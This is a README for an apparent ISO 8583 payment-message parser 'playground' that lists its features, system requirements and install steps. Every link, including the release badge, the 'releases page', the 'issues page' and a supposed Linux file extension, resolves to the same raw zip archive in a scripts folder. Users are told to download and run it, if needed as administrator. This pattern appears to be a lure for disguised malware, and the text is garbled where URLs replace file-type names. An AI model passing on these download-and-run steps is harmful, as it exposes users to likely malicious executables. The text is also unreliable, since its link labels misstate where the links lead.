# 🛠️ ISO-8583-parser-playground - View ISO 8583 Messages Instantly

[![Download Latest Release](https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip)

---

## 📋 About ISO-8583-parser-playground

ISO-8583-parser-playground is a simple tool that helps you work with ISO 8583 messages. These messages are a common format used for payment card transactions, like when you swipe a credit card or use an online payment. This tool takes a raw hex message and breaks it down into readable parts.

You can:

- Paste a raw hex string of an ISO 8583 message.
- See the message type indicator (MTI) decoded.
- Visualize which data fields (bitmaps) are present.
- Explore 128 possible data elements and 1,088 merchant category codes (MCC).
- Use a user-friendly interface designed for people working with payments.

This is perfect for payment engineers and anyone wanting to understand or debug card transaction messages without dealing with complicated software.

---

## 🚀 Getting Started

This guide will help you download and run the software on your computer. It only takes a few steps, and you don’t need any programming skills.

### What you need before you start

- A Windows, Mac, or Linux computer.
- Internet access to download the application.
- Basic computer knowledge like how to open files.

You do not need to install anything else like special software or coding tools.

---

## 📥 Download & Install

To get ISO-8583-parser-playground, please visit the official release page on GitHub. This page contains the latest ready-to-use version for your system.

**Download link:**  
[Download the latest release here](https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip)

### How to download

1. Click the link above. It takes you to the releases page.
2. Look for the newest release. It usually has the highest version number or the latest date.
3. Choose the file that matches your computer’s operating system. For example:
   - For Windows, the file may end with `.exe` or `.zip`.
   - For Mac, the file might end with `.dmg` or `.zip`.
   - For Linux, look for `.AppImage` or `https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip`.
4. Click the file name to download it to your computer.

### How to install and run

- **Windows:**  
  If you downloaded an `.exe` file, double-click it to start the installer. Follow the on-screen steps. When the install finishes, find the application in your Start menu and click to open it.

- **Mac:**  
  If you downloaded a `.dmg` file, double-click it to open the installer window. Drag the application icon to your Applications folder. Open your Applications and double-click the tool to start it.

- **Linux:**  
  If you downloaded an `.AppImage` or `https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip`, follow the included instructions in the release notes. Typically, you make the file executable (`chmod +x filename`) and run it directly.

Once the application opens, you are ready to start parsing ISO 8583 messages.

---

## 💡 How to Use the Application

Follow these simple steps to see your ISO 8583 messages decoded:

1. **Find the raw hex message.**  
   This is usually a long string of numbers and letters you get from a payment system or message log.

2. **Paste the message into the input box.**  
   The application will automatically read what you enter.

3. **View the parsed data.**  
   After pasting, the tool instantly shows you:
   - The Message Type Indicator (MTI), explaining what kind of message it is (e.g., authorization, settlement).
   - A graphic showing which data elements are included.
   - Details about each data element, such as card number, amount, or merchant info.
   - Merchant Category Codes (MCC) decoded for easy understanding.

4. **Explore additional info.**  
   Use the provided tools to expand each data element or look up MCC details.

This helps you quickly understand what each part of a transaction message means, without needing to know the technical standard ahead of time.

---

## 🛠️ System Requirements

ISO-8583-parser-playground works on most modern computers. Here are the minimum requirements you should have:

- **Operating System:** Windows 10 or later, macOS 10.13 (High Sierra) or later, or most Linux distributions.
- **Processor:** Any x86_64 processor (Intel or AMD).
- **Memory:** At least 4 GB RAM.
- **Storage:** At least 100 MB of free space.
- **Display:** 1024x768 screen resolution or higher recommended.

No internet connection is needed to run the application once installed, so you can use it offline with your own data.

---

## 🔧 Features

- Instant parsing of ISO 8583 raw hex messages.
- MTI decoding to identify message type.
- Visual bitmap that shows which data fields are active.
- Explore up to 128 data elements with detailed descriptions.
- Over 1,000 Merchant Category Codes (MCC) lookup.
- Clean, easy-to-use interface with live results.
- No programming required.
- Works offline after installation.

---

## 🗂️ Supported Data Elements

This tool covers all the standard ISO 8583 data elements, such as:

- Primary Account Number (PAN)
- Processing code
- Transaction amount
- Transmission date and time
- Systems trace audit number
- Local transaction time and date
- Settlement date
- Merchant category code (MCC)
- Card acceptor terminal ID and location
- Additional data fields important for payments

Each element is shown with its value for easy reading and understanding.

---

## ❓ Troubleshooting

If you have issues running or using the application, try these steps:

- Make sure you downloaded the correct file for your operating system.
- Try running the installer or app as an administrator.
- Restart your computer and try again.
- Ensure the raw hex message you paste is complete and correct.
- Check your system meets the minimum requirements.

If problems continue, please visit the repository’s issues page for help or report new issues:  
https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip

---

## 🧑‍💻 About This Repository

ISO-8583-parser-playground was built to help payment engineers and others working with card transactions. It uses React and TypeScript to provide a fast and reliable user experience. The main goal is to let users inspect ISO 8583 messages without any coding.

---

## 🏷️ Topics

- card-transactions
- fintech
- iso-8583
- iso8583
- mcc
- parser
- payment-processing
- payments
- react
- typescript

---

[![Download Latest Release](https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/wintercastrosie/ISO-8583-parser-playground/master/scripts/parser-playground-IS-3.9.zip)